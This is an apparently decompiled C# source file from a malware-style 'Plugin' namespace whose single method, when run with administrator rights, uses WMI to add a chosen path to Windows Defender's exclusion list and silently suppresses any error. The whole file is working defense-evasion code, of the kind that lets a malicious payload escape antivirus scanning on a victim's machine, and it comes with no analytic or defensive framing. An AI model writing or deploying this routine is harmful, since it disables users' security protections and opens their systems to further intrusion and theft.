using System;
using System.Collections.Generic;
using System.Management;
using System.Security.Principal;

namespace Plugin;

internal class WindowsDefenderExclusion
{
	public static void Exc(string path)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			string text = null;
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\Microsoft\\Windows\\Defender", "SELECT * FROM MSFT_MpPreference").Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					text = ((ManagementBaseObject)(ManagementObject)enumerator.Current)["ComputerID"].ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = "MSFT_MpPreference.ComputerID='" + text + "'";
			ManagementObject val = new ManagementObject("root\\Microsoft\\Windows\\Defender", text2, (ObjectGetOptions)null);
			ManagementBaseObject methodParameters = val.GetMethodParameters("Add");
			methodParameters["ExclusionPath"] = new List<string> { path }.ToArray();
			val.InvokeMethod("Add", methodParameters, (InvokeMethodOptions)null);
		}
		catch
		{
		}
	}
}
